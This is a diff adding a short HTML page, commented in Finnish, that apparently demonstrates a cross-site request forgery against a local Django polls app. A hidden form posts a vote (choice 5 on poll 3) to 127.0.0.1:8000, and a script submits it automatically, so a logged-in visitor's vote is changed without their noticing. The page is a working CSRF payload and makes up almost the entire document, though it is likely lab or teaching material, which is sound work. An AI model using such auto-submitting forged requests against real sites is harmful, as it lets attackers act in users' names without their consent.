@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h1>Malicious CSRF Demo</h1>
+    <p>Kun käyttäjä on kirjautuneena palveluun ja lataa tämän sivun, hänen ääniään manipuloidaan.</p>
+
+    <!-- Tämä lomake postaa suoraan sinun /vote/ -polkuun -->
+    <form action="http://127.0.0.1:8000/polls/3/vote/" method="POST" id="csrf-form">
+        <input type="hidden" name="choice" value="5">
+    </form>
+
+    <script>
+        // Automaatinen lähetys — käyttäjä ei näe mitään
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
